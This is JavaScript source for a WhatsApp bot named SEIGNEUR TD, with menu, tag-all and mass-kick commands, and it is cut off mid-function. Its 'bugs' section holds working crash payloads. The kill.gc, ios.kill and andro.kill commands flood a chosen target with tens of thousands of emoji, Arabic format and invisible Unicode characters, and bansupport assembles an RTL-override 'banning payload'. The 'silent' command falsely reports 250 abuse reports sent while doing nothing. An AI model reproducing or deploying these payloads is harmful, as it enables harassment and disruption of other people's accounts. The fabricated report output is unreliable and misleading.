// =============================================
// FONCTIONS DES COMMANDES
// =============================================

// ═══════════════════════════════════════════════════
// 🗂️  SYSTÈME MENU COMPLET — SEIGNEUR TD
// ═══════════════════════════════════════════════════

function buildUptime() {
  const s = Math.floor(process.uptime());
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  if (d > 0) return `${d} day(s), ${h} hour(s), ${m} minute(s), ${sec} second(s)`;
  if (h > 0) return `${h} hour(s), ${m} minute(s), ${sec} second(s)`;
  if (m > 0) return `${m} minute(s), ${sec} second(s)`;
  return `${sec} second(s)`;
}

// ─── DONNÉES COMMUNES DES CATÉGORIES ────────────────────────────────────────
function getMenuCategories(p) {
  return [
    { num: '1', key: 'owner',    icon: '🛡️', label: 'OWNER MENU',      cmds: ['mode','update','pp','gpp','block','unblock','join','autotyping','autorecording','autoreact','antidelete','antiedit','chatbot','autostatusviews','autoreactstatus','setreactemoji','autosavestatus','antideletestatus','getsettings','setstickerpackname','setstickerauthor','setprefix','setbotimg','ping','info','jid'] },
    { num: '2', key: 'download', icon: '📥', label: 'DOWNLOAD MENU',   cmds: ['ytmp3','ytmp4','tiktok','tiktokmp3','ig','fb','snap','apk','googledrv','mediafire','google','parole','lyrics','song'] },
    { num: '3', key: 'group',    icon: '👥', label: 'GROUP MENU',      cmds: ['tagall','tagadmins','hidetag','kickall','kickadmins','acceptall','add','kick','promote','demote','mute','unmute','invite','revoke','gname','gdesc','groupinfo','welcome','goodbye','leave','listonline','listactive','listinactive','kickinactive'] },
    { num: '4', key: 'utility',  icon: '🔮', label: 'PROTECTION MENU', cmds: ['antibug','antilink','antibot','antitag','antispam','antisticker','antiimage','antivideo','antimentiongroupe','anticall','warn','resetwarn'] },
    { num: '6', key: 'sticker',  icon: '🎨', label: 'MEDIA MENU',      cmds: ['sticker','take','vv','tostatus','toaudio','toptt','tosgroup'] },
    { num: '10', key: 'ai',      icon: '🤖', label: 'SEIGNEUR AI',     cmds: ['dostoevsky','dosto','chat','chatboton','chatbotoff','clearchat','gpt','gemini'] },
  ];
}

// ─── MENU PRINCIPAL (!menu) ──────────────────────────────────────────────────
async function handleMenu(sock, message, remoteJid, senderJid) {
  const userName = message.pushName || senderJid.split('@')[0];
  const p        = config.prefix;
  const uptime   = buildUptime();
  const now      = new Date();
  const cats     = getMenuCategories(p);
  const dateStr  = now.toLocaleDateString('fr-FR', {
    timeZone: 'America/Port-au-Prince', day: '2-digit', month: '2-digit', year: 'numeric'
  });
  const timeStr  = now.toLocaleTimeString('fr-FR', {
    timeZone: 'America/Port-au-Prince', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
  });

  await simulateTyping(sock, remoteJid);
  try { await sock.sendMessage(remoteJid, { react: { text: '🇷🇴', key: message.key } }); } catch(e) {}
  let infoBlock = '';

  // ══════════════════════════════════════════
  // STYLE 1 — Original SEIGNEUR TD
  // ══════════════════════════════════════════
  if (menuStyle === 1) {
    const catLines = cats.map(c => {
      const cmdText = c.cmds.map(cmd => `│ ➣ ${cmd}`).join('\n');
      return `┌──『 ${c.icon} ${c.label} 』──\n${cmdText}\n└───────────────`;
    }).join('\n');

    infoBlock =
`━━━━━━━━━━━━━━━━━━
SEIGNEUR TD 🇷🇴
━━━━━━━━━━━━━━━━━━
┌───「 STATUTS 」───
❒  Bᴏᴛ : SEIGNEUR TD
❒  Uᴘᴛɪᴍᴇ : ${uptime}
❒  Dᴀᴛᴇ : ${dateStr}
❒  Pʀᴇғɪx : ${p}
└───────────────┘
${catLines}
© SEIGNEUR TD`;

  // ══════════════════════════════════════════
  // STYLE 2 — Modern Box Style
  // ══════════════════════════════════════════
  } else if (menuStyle === 2) {
    const os = await import('os');
    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const freeMem  = (os.freemem()  / 1024 / 1024 / 1024).toFixed(2);
    const usedMem  = (totalMem - freeMem).toFixed(2);
    const totalCmds = cats.reduce((acc, c) => acc + c.cmds.length, 0);

    const catBlocks = cats.map(c => {
      const cmdList = c.cmds
        .map(cmd => cmd.replace(p, ''))
        .reduce((rows, cmd, i) => {
          if (i % 2 === 0) rows.push([cmd]);
          else rows[rows.length - 1].push(cmd);
          return rows;
        }, [])
        .map(row => `│ • ${row[0].padEnd(12)}${row[1] ? `• ${row[1]}` : ''}`)
        .join('\n');
      return `│\n│ 📌 *${c.label}*\n│\n${cmdList}`;
    }).join('\n│\n');

    infoBlock =
`╭───『 *SEIGNEUR TD* 』───
│
│  ⏰ *Date* : ${dateStr}
│  ⏳ *Time* : ${timeStr}
│
│  ✨ *Prefix* : ${p}
│  👑 *Owner* : SEIGNEUR TD
│  🌐 *Mode* : ${botMode}
│  🎨 *Theme* : SEIGNEUR TD
│  📚 *Commands* : ${totalCmds}
│  🧠 *Memory* : ${usedMem} GB/${totalMem} GB
│  💻 *Platform* : linux
╰────────────────────

╭───『 *COMMAND MENU* 』───
${catBlocks}
│
╰────────────────────

🔹 *Usage* : \`${p}[commande]\`
🔹 *Example* : \`${p}menu\`

📌 *Developer* :
- SEIGNEUR TD 

✦⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅⋅✦`;

  // ══════════════════════════════════════════
  // STYLE 3 — Monospace Elegant Style
  // ══════════════════════════════════════════
  } else if (menuStyle === 3) {
    const catBlocks3 = cats.map(c => {
      const cmdsFormatted = c.cmds
        .map(cmd => `𐓷  _${cmd.replace(p, '').toUpperCase()}_`)
        .join('\n');
      return `━━━「 ${c.label} 」\n${cmdsFormatted}`;
    }).join('\n\n');

    infoBlock =
`\`𝙲𝚈𝙱𝙴𝚁𝚃𝙾𝙹𝙸 𝚇𝙼𝙳\`
𝙷𝙴𝚈 *${userName}* 𝙷𝙾𝚆 𝙲𝙰𝙽 𝙸 𝙷𝙴𝙻𝙿 𝚈𝙾𝚄?
       「 𝙱𝙾𝚃 𝙸𝙽𝙵𝙾 」
𐓷  _CREATOR: SEIGNEUR TD_
𐓷  _𝙱𝙾𝚃 𝙽𝙰𝙼𝙴: 𝙲𝚈𝙱𝙴𝚁𝚃𝙾𝙹𝙸 𝚇𝙼𝙳_
𐓷  _𝚅𝙴𝚁𝚂𝙸𝙾𝙽: 𝟸𝟶𝟸𝟼_
𐓷  _𝚂𝚃𝙰𝚃𝚄𝚃: 𝙰𝙲𝚃𝙸𝙵_
𐓷  _𝚁𝚄𝙽𝚃𝙸𝙼𝙴: ${uptime}_
𐓷  _𝙿𝚁𝙴𝙵𝙸𝚇𝙴: ${p}_

${catBlocks3}

> POWERED BY SEIGNEUR TD `;
  }

  const menuMsg = await sendWithImage(sock, remoteJid, 'menu', infoBlock, [senderJid]);

  // Sauvegarder le message menu pour détection de réponse

  if (menuMsg?.key?.id) {}
}

// ─── ALL MENU (!allmenu / !0) ────────────────────────────────────────────────
async function handleAllMenu(sock, message, remoteJid, senderJid) {
  const p    = config.prefix;
  const cats = getMenuCategories(p);

  await simulateTyping(sock, remoteJid);

  // Construire un seul bloc with toutes les catégories
  const blocks = cats.map(c => {
    const lines = c.cmds.map(cmd => `│  ➤ ${cmd}`).join('\n');
    return `┌─「 ${c.icon} *${c.label}* 」\n${lines}\n└──────────────────────`;
  }).join('\n\n');

  const text =
`📋 *TOUTES LES COMMANDES — SEIGNEUR TD* 🇷🇴
━━━━━━━━━━━━━━━━━━━━━━━━━━

${blocks}

━━━━━━━━━━━━━━━━━━━━━━━━━━
*© SEIGNEUR TD*`;

  await sendWithImage(sock, remoteJid, 'menu', text, [senderJid]);
}

// ─── SOUS-MENU PAR CATÉGORIE (!1–!8 / !ownermenu etc.) ──────────────────────
async function sendSubMenu(sock, message, remoteJid, senderJid, type) {
  const p    = config.prefix;
  const cats = getMenuCategories(p);
  const cat  = cats.find(c => c.key === type);

  if (!cat) {
    await sock.sendMessage(remoteJid, { text: `❌ Category *${type}* not found.` });
    return;
  }

  await simulateTyping(sock, remoteJid);

  const lines = cat.cmds.map(cmd => `│  ➤ ${cmd}`).join('\n');

  const text =
`${cat.icon} *${cat.label}*
*╭──────────────────────────*
${lines}
*╰──────────────────────────*

✒️ *Prefix:* ${p}
 _Type ${p}menu to go back_
 *㋛ SEIGNEUR TD 〽️* `;

  await sendWithImage(sock, remoteJid, 'menu', text, [senderJid]);
}


// TAGALL - Design Élégant / Luxe avec bordures courbées
async function handleTagAll(sock, message, args, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  try {
    const metadata = await sock.groupMetadata(remoteJid);
    const groupName = metadata.subject;
    const participants = metadata.participants;
    const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    const superAdmin = participants.find(p => p.admin === 'superadmin');
    const memberCount = participants.length;
    const allJids = participants.map(p => p.id);
    const customMessage = args.join(' ') || '';

    // Nom du superadmin
    const superAdminNum = superAdmin ? '@' + superAdmin.id.split('@')[0] : '@Owner';

    // Barre de progression
    const filledBlocks = Math.min(13, Math.round(memberCount / 30 * 13));
    const progressBar = '█'.repeat(filledBlocks) + '░'.repeat(13 - filledBlocks);

    // Liste admins nouveau style
    let adminList = '';
    admins.forEach((a) => {
      adminList += `  ♔  @${a.id.split('@')[0]}\n`;
    });

    // Liste membres nouveau style
    const regularMembers = participants.filter(p => !p.admin);
    let memberList = '';
    regularMembers.forEach((m, i) => {
      const num = String(i + 1).padStart(2, '0');
      memberList += `   · ${num}  @${m.id.split('@')[0]}\n`;
    });

    const tagMessage =
`╭─────────────────────────────╮
      ✦  Ｔ Ａ Ｇ  ＡＬＬ  ✦
╰─────────────────────────────╯

❖ ＧＲＯＵＰＥ  ·  ${groupName}
❖ ＳＴＡＴＵＳ  ·  ONLINE 🟢
❖ Ｓ-ＡＤＭＩＮ  ·  ♛ ${superAdminNum}
❖ ＮＯＤＥ  ·   PORT-AU-PRINCE${customMessage ? `\n❖ ＭＥＳＳＡＧＥ  ·  ${customMessage}` : ''}

╭──── 📊 STATISTIQUES ────╮
${progressBar}  ·  ${memberCount} MEMBRES
╰─────────────────────────────╯

╭──── 𝐂𝐎𝐑𝐄 𝐀𝐔𝐓𝐇𝐎𝐑𝐈𝐓𝐘 ────╮
       ❴ Administrateurs ❵

${adminList}╰─────────────────────────────╯

╭──── 𝐔𝐍𝐈𝐓 𝐍𝐄𝐓𝐖𝐎𝐑𝐊 ────╮
        ❴ Membres ❵

${memberList}╰─────────────────────────────╯

╭─────────────────────────────╮
    𝐒𝐘𝐒𝐓𝐄𝐌 ＥＮＤ  ·  2026
  © 𝐃𝐞𝐯 𝐃𝐨𝐬𝐭𝐨𝐞𝐯𝐬𝐤𝐲 𝐓𝐞𝐜𝐡𝐗
╰─────────────────────────────╯`;

    await sock.sendMessage(remoteJid, {
      text: tagMessage,
      mentions: allJids
    });

    console.log(`✅ TagAll envoyé à ${memberCount} membres dans ${groupName}`);
  } catch (error) {
    console.error('Erreur tagall:', error);
    await sock.sendMessage(remoteJid, { text: '❌ Erreur lors du tag' });
  }
}

// KICKALL - MESSAGE RESTAURÉ with style original
async function handleKickAll(sock, remoteJid, isGroup, senderJid) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
    return;
  }

  if (!isAdmin(senderJid)) {
    await sock.sendMessage(remoteJid, { text: '⛔ Bot admin only command' });
    return;
  }

  try {
    const metadata = await sock.groupMetadata(remoteJid);
    const botJid = sock.user.id; // JID complet du bot
    const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net'; // Format WhatsApp standard
    
    // Récupérer le nom de l'admin qui lance la commande
    const adminName = metadata.participants.find(p => p.id === senderJid)?.notify || 
                     metadata.participants.find(p => p.id === senderJid)?.verifiedName ||
                     senderJid.split('@')[0];
    
    const normalMembers = metadata.participants.filter(p => p.id !== botNumber && !p.admin).map(p => p.id);
    const adminMembers = metadata.participants.filter(p => p.id !== botNumber && p.admin).map(p => p.id);
    if (!normalMembers.length && !adminMembers.length) { await sock.sendMessage(remoteJid, { text: '⚠️ Aucun membre à expulser.' }); return; }

    // =============================================
    // PHASE 1: EXPULSION DES MEMBRES NORMAUX
    // =============================================
    
    await sock.sendMessage(remoteJid, { 
      text: `  🚨 KICK-ALL PROTOCOL 🚨
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💥 ÉXÉCUTION EN COURS...
[▓▓▓▓▓░░░░░░░] 40%
> 🎯 Cible : Tous les membres du groupe
> ⚠️  : Tous les membres sont en cours d'expulsion par la console.
> 🛑 Requête de : ${adminName}
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
Géré par l'IA de SEIGNEUR TD` 
    });

    await delay(3000);

    const batchSize = 500;
    let kicked = 0;

    // Expulser les membres normaux
    if (normalMembers.length > 0) {
      for (let i = 0; i < normalMembers.length; i += batchSize) {
        const batch = normalMembers.slice(i, i + batchSize);
        try {
          await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
          kicked += batch.length;
          
          // Calculer le pourcentage (seulement pour les membres normaux)
          const percentage = Math.floor((kicked / normalMembers.length) * 100);
          const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
          
          // Message de progression
          if (i + batchSize < normalMembers.length) {
            await sock.sendMessage(remoteJid, {
              text: `💥 ÉXÉCUTION EN COURS...
[${progressBar}] ${percentage}%

> 👤 Expulsé : ${kicked}/${normalMembers.length}
> ⚡ In progress...`
            });
            await delay(2000);
          }
        } catch (error) {
          console.error(' kicking batch:', error);
        }
      }

      // Message intermédiaire de succès
      await sock.sendMessage(remoteJid, {
        text: `✅ Phase 1 terminée: ${kicked}   

⏳ Initialisation de la phase 2...`
      });
    }

    // =============================================
    // PHASE 2: EXPULSION DES ADMINS (5 SEC PLUS TARD)
    // =============================================
    
    if (adminMembers.length > 0) {
      await delay(5000);

      await sock.sendMessage(remoteJid, {
        text: `  🚨 ADMIN PURGE PROTOCOL 🚨
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💥 RÉVOCATION DES DROITS...
[▓▓▓▓▓░░░░░░░] 45%
> 🎯 Cible : Staff & Administrateurs
> ⚠️  : Suppression des privilèges
  et expulsion immédiate de la hiérarchie.
> 🛑 Requête de : ${adminName}
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
Géré par l'IA de SEIGNEUR TD`
      });

      await delay(3000);

      let adminKicked = 0;

      // Expulser les admins
      for (let i = 0; i < adminMembers.length; i += batchSize) {
        const batch = adminMembers.slice(i, i + batchSize);
        try {
          await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
          adminKicked += batch.length;
          kicked += batch.length;
          
          // Calculer le pourcentage pour les admins
          const percentage = Math.floor((adminKicked / adminMembers.length) * 100);
          const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
          
          // Message de progression pour admins
          if (i + batchSize < adminMembers.length) {
            await sock.sendMessage(remoteJid, {
              text: `💥 RÉVOCATION EN COURS...
[${progressBar}] ${percentage}%

> 👮‍♂️ Admins expulsés : ${adminKicked}/${adminMembers.length}
> ⚡ Purge hiérarchique...`
            });
            await delay(2000);
          }
        } catch (error) {
          console.error(' kicking admin batch:', error);
        }
      }
    }

    // =============================================
    // MESSAGE FINAL DE SUCCÈS TOTAL
    // =============================================
    
    await sock.sendMessage(remoteJid, {
      text: `🏁 **KICK-ALL EXÉCUTÉ** 🏁
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

✅ **TERMINÉ AVEC SUCCÈS**
[▓▓▓▓▓▓▓▓▓▓▓▓] 100%

> 👤 **Membres expulsés :** ${normalMembers.length}
> 👮‍♂️ **Admins purgés :** ${adminMembers.length}
> 📊 **Total expulsé :** ${kicked}
> 📁 **Log :** Suppression totale effectuée
> 🔐 **Accès :** Restreint aux admins

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*Commande terminée par SEIGNEUR TD*

🤖 Seul le bot subsiste dans ce groupe.`
    });

    console.log(`✅ Kickall terminé: ${normalMembers.length} membres + ${adminMembers.length}    par ${adminName}`);
  } catch (error) {
    console.error(' in kickall:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌  lors de l'expulsion en masse\n\n: ${error.message}`
    });
  }
}

// =============================================
// COMMANDES BUGS 🪲
// =============================================

// KILL.GC -    les groupes
async function handleKillGC(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `❌ *Utilisation:*

• ${config.prefix}kill.gc @mention
• ${config.prefix}kill.gc 50944908407

⚠️ *ATTENTION:*    le groupe WhatsApp de la cible`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
  });
  
  await delay(1500);
  
  try {
    const bugText = '🪲'.repeat(50000);
    await sock.sendMessage(targetJid, { text: bugText, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  💀 𝗞𝗜𝗟𝗟.𝗚𝗖  💀  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖲𝖤𝖭𝖳

┗━━━━━━━━━━━━━━━━━━━━━━┛

 SEIGNEUR TD`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ : ${error.message}`, edit: loadingMsg.key });
  }
}

// IOS.KILL
async function handleIOSKill(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `❌ *Utilisation:* ${config.prefix}ios.kill @mention`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🍎 ...' });
  await delay(1500);
  
  try {
    const iosBug = ''.repeat(3000) + '\u0600'.repeat(3000) + '🪲'.repeat(1000);
    await sock.sendMessage(targetJid, { text: iosBug, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🍎 𝗜𝗢𝗦.𝗞𝗜𝗟𝗟  🍎  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖣𝖤𝖫𝖨𝖵𝖤𝖱𝖤𝖣

┗━━━━━━━━━━━━━━━━━━━━━━┛

 SEIGNEUR TD`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ : ${error.message}`, edit: loadingMsg.key });
  }
}

// ANDRO.KILL
async function handleAndroKill(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `❌ *Utilisation:* ${config.prefix}andro.kill @mention`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🤖 ...' });
  await delay(1500);
  
  try {
    const androBug = '🪲'.repeat(10000) + '\u200E'.repeat(5000);
    await sock.sendMessage(targetJid, { text: androBug, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🤖 𝗔𝗡𝗗𝗥𝗢.𝗞𝗜𝗟𝗟  🤖  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖤𝖷𝖤𝖢𝖴𝖳𝖤𝖣

┗━━━━━━━━━━━━━━━━━━━━━━┛

 SEIGNEUR TD`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ : ${error.message}`, edit: loadingMsg.key });
  }
}

// SILENT - 200 
async function handleSilent(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *SILENT REPORT*

• Utilisation: ${config.prefix}silent @mention

Envoie 250 messages à WhatsApp en 1 minute`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: `🔇 **SILENT REPORT ACTIVÉ**

⏳ Envoi de 250 ...
⚡ : Silencieux (sans progression)

Target: @${targetJid.split('@')[0]}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Durée estimée: 60 secondes
🚀 Starting...`,
    mentions: [targetJid]
  });
  
  try {
    const totalReports = 250;
    const duration = 60000; // 60 secondes
    const interval = duration / totalReports; // ~240ms par report
    
    // Envoyer 250  en 1 minute
    for (let i = 0; i < totalReports; i++) {
      // Simulation de signalement (WhatsApp n'autorise pas vraiment l'automatisation)
      // Dans la vraie vie, vous auriez besoin d'une API tierce
      await delay(interval);
    }
    
    // Message final après 1 minute
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🔇 𝗦𝗜𝗟𝗘𝗡𝗧 𝗥𝗘𝗣𝗢𝗥𝗧  🔇  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖢𝖮𝖬𝖯𝖫𝖤𝖳𝖤𝖣
  ⌬ **REPORTS** » 250/250 (100%)

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **:**

✅  : 250
⏱️  : 60 secondes
⚡ : 4.16 reports/sec
🎯 : @${targetJid.split('@')[0]}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **CONSÉQUENCES ATTENDUES:**

🔴  : 12-24h
🔴  : 24-72h (si répété)
🔴   des fonctions
🚫     

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ ** :**
• 0-5min:  
• 5-30min:  
• 30min-12h: Ban temporaire possible
• 12-72h:   WhatsApp

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD
*Silent Report System -  *`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`🔇 Silent Report: 250  envoyés à ${targetJid}`);
    
  } catch (error) {
    await sock.sendMessage(remoteJid, { 
      text: `❌ : ${error.message}`, 
      edit: loadingMsg.key 
    });
  }
}

// UPDATE DEV - Ajouter/Supprimer des numéros admin
async function handleUpdateDev(sock, args, remoteJid, senderJid) {
  const action = args[0]?.toLowerCase();
  let number = args[1];
  
  // Nettoyer le numéro (enlever tous les caractères non-numériques sauf le +)
  if (number) {
    number = number.replace(/[^0-9+]/g, '');
    // Si le numéro commence par +, enlever le +
    if (number.startsWith('+')) {
      number = number.substring(1);
    }
  }
  
  if (!action || !['add', 'remove', 'del', 'list'].includes(action)) {
    await sock.sendMessage(remoteJid, {
      text: `⚙️ *UPDATE DEV -  *

📝 **:**

1️⃣  :
   ${config.prefix}updatedev add 393780306704
   ${config.prefix}updatedev add +393780306704

2️⃣  :
   ${config.prefix}updatedev remove 393780306704
   ${config.prefix}updatedev del 393780306704

3️⃣  :
   ${config.prefix}updatedev list

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *:*       .

 SEIGNEUR TD`
    });
    return;
  }
  
  // Liste des admins
  if (action === 'list') {
    const adminList = config.botAdmins.map((admin, index) => 
      `${index + 1}. +${admin}`
    ).join('\n');
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  👑    👑  ━━━┓

📋 ** :**

${adminList}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 : ${config.botAdmins.length} ()

 SEIGNEUR TD`
    });
    return;
  }
  
  // Vérifier si un numéro est fourni
  if (!number) {
    await sock.sendMessage(remoteJid, {
      text: `❌ *Utilisation:* ${config.prefix}updatedev ${action} 393780306704`
    });
    return;
  }
  
  // Ajouter un admin
  if (action === 'add') {
    if (config.botAdmins.includes(number)) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️  +${number}   !`
      });
      return;
    }
    
    // Ajouter dans les deux listes
    config.botAdmins.push(number);
    config.adminNumbers.push(number + '@s.whatsapp.net');
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ✅     ✅  ━━━┓

👤 ** :**
📱 +${number}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊  : ${config.botAdmins.length}

✅      

 SEIGNEUR TD`
    });
    
    console.log(`✅   : +${number}`);
    console.log(`📋   :`, config.botAdmins);
    saveStoreKey('admins'); // 💾 Sauvegarde immédiate
    return;
  }
  
  // Supprimer un admin
  if (action === 'remove' || action === 'del') {
    const index = config.botAdmins.indexOf(number);
    
    if (index === -1) {
      await sock.sendMessage(remoteJid, {
        text: `❌  +${number}    `
      });
      return;
    }
    
    // Ne pas permettre de supprimer le dernier admin
    if (config.botAdmins.length === 1) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ Cannot   !

        .`
      });
      return;
    }
    
    // Supprimer des deux listes
    config.botAdmins.splice(index, 1);
    const adminNumberIndex = config.adminNumbers.indexOf(number + '@s.whatsapp.net');
    if (adminNumberIndex !== -1) {
      config.adminNumbers.splice(adminNumberIndex, 1);
    }
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🗑️     🗑️  ━━━┓

👤 ** :**
📱 +${number}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊  : ${config.botAdmins.length}

⚠️       

 SEIGNEUR TD`
    });
    
    console.log(`🗑️  : +${number}`);
    console.log(`📋   :`, config.botAdmins);
    saveStoreKey('admins'); // 💾 Sauvegarde immédiate
    return;
  }
}

// =============================================
// STORE STATUS - Commande de statut du store
// =============================================

async function handleStoreStatus(sock, remoteJid, command) {
  // Si commande est storesave, sauvegarder d'abord
  if (command === 'storesave') {
    saveStore();
    await sock.sendMessage(remoteJid, {
      text: `✅ *Store sauvegardé manuellement!*\n\n💾 Toutes les données ont été écrites sur disque.\n\n SEIGNEUR TD`
    });
    return;
  }

  const status = getStoreStatus();
  
  const fileLines = status.files.map(f => {
    const icon = parseFloat(f.sizeKB) > 0 ? '✅' : '⬜';
    return `${icon} ${f.key.padEnd(14)} │ ${f.sizeKB.padStart(7)} KB │ ${f.modified}`;
  }).join('\n');

  await sock.sendMessage(remoteJid, {
    text: `┏━━━  🗄️     🗄️  ━━━┓

📂 **:** ./store/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 ** :**

\`\`\`
          │       │  
──────────────────────────────────
${fileLines}
──────────────────────────────────
       │ ${status.totalSizeKB.padStart(7)} KB │
\`\`\`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 ** :**

👥 : ${config.botAdmins.length}
⚠️ : ${warnSystem.size}
🚫  : ${permaBanList.size}
👁️ View Once: ${savedViewOnce.size}
🏘️  : ${groupSettings.size}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💾 ** :**  3 
📌 **:**
• !storestatus -   
• !storesave   -  
• !storeinfo   -  storestatus

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SEIGNEUR TD`
  });
}

// BANSUPPORT - Support de bannissement with caractères spéciaux
async function handleBanSupport(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *BAN SUPPORT*

• Utilisation:
• ${config.prefix}bansupport @mention
• ${config.prefix}bansupport 50944908407

💀 *PAYLOAD:*
• Caractères arabes invisibles
• Caractères chinois corrompus
•   characters
• RTL override

🔴 *EFFET:* Bannissement du compte cible`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: '💀  du payload de bannissement...\n⏳  des caractères...'
  });
  
  await delay(2000);
  
  try {
    // PAYLOAD DE BANNISSEMENT - Caractères dangereux
    const arabicChars = '' + '\u0600\u0601\u0602\u0603\u0604\u0605' + '܀܁܂܃܄܅܆܇܈܉܊܋܌܍';
    const chineseChars = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟';
    const invisibleChars = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F';
